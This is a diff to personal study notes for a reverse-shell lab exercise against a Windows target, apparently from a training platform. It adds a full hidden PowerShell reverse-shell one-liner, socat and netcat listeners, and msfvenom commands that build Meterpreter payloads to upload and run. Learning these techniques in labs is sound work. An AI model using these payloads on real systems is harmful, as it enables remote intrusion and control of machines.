@@ -1103,14 +1103,33 @@ xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.199.85 /u:ant /p:'
 
 9. Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.
 
-Step 1 - using Task 6 command to create a listener
+Step 1 - using Task 6 command to create a listener on the Attacker machine
+```
+socat TCP-L:1234 -
+```
+
+Step 2 - use the netcat cheatsheet on Ncat with PowerShell
+
+- use the following command on the TARGET Win machine to connect to the listener 
 ```
 socat TCP-L:<PORT> EXEC:powershell.exe,pipes
 ```
 
-Step 2 - use the following command on the TARGET machine to connect to the listener 
+1:37:23
+
+Step 3 - Ncat
+- RDP to the Windows machine
+- Open PowerShell 
+- Use the following command and change the ip to the Attack box 
+Use PayloadsAllTheThings - Seearch for Ncat - look for PowerShell
+
+[Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 ```
-socat TCP:<Target-IP>:<Target-PORT> -
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.244.165",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+```
+nc -lvnp 1234
 ```
 
 
@@ -1119,8 +1138,60 @@ socat TCP:<Target-IP>:<Target-PORT> -
 
 10. Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.
 
+Step 1 - use the Task 9 command below (Use the Attack box ip)
+```
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.60.103 LPORT=1234
+```
+Step 2 - use 'pwd' to locate the Shell.exe
+Step 3 - open a browser with the Target ip and upload the Shell.exe
+Step 4 - Open MSfconsole in the Attack box and use Multi/handler 
+- Set LHOST Attackbox ip
+- Set LPORT 1234
+- run
+
+Step 5 - click on the shell.exe from the browser
+- background 
+
+Step 6 - RDP to the Windows and open the browser with the Target ip
+- Save the shell.exe file and run
+
+
+
+
+
 
 11. Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat -- does this work?
+
+Step 1 - 
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shells.exe LHOST=10.10.233.226 LPORT=1234
+```
+or 
+```
+msfvenom -p windows/x64/meterpreter_reverse_tcp -f exe -o shells.exe LHOST=10.10.174.70 LPORT=777
+```
+- RDP to Windows
+- Uploads the shell.exe 
+- nc -lvnp 1022
+- msfconsole and create a listener (use multi/handler, Set LHOST, LPORT, Run)
+- run ?cmd= Powershell command
+
+
+2:05:46 - Staged
+
+
+```
+msfvenom --list payloads | grep "windows/x64/meterpreter"
+```
+
+A Windows 64bit staged Meterpreter payload
+```
+Windows/x64/etterpreter/reverse_tcp
+```
+
+
 
 
 
